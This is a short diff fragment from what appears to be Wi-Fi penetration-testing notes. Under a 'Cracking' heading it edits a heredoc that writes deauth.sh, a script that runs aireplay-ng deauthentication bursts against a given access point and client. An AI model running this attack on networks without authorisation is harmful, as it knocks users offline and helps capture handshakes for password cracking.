@@ -56,7 +56,7 @@ airodump-ng --manufacturer --beacons --showack --wps --uptime \
 
 ## Cracking
 ```bash
-cat >> deauth.sh << "EndOfMessage"
+cat > deauth.sh << "EndOfMessage"
 iwconfig wlan1 channel $1
 
 aireplay-ng -0 99 -D -a $2 -c $3 wlan1
